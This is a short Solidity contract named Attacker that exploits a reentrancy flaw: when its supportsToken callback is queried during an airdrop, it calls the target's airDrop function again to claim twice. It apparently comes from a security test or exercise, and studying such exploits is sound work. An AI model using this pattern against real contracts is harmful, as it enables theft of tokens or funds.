contract Attacker is Bank {
    C c;
    bool doReenter;
    bool done;
    constructor(C c_, bool r) { c = c_; doReenter = r; }
    function go() external { c.airDrop(); }
    function supportsToken() external view override returns (bytes32) {
        if (doReenter && !done) {
            done = true;
            try c.airDrop() {} catch {}
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

